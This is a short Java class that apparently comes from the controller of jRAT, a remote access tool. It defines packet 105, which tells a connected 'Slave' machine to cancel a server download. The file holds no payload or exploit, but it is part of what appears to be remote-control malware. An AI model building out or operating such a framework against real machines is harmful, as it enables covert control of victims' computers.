package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;

public class Packet105CancelServerDownload extends AbstractOutgoingPacket {
	
	private String remote;
	
	public Packet105CancelServerDownload(String remote) {
		this.remote = remote;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(remote);
	}

	@Override
	public byte getPacketId() {
		return 105;
	}

}
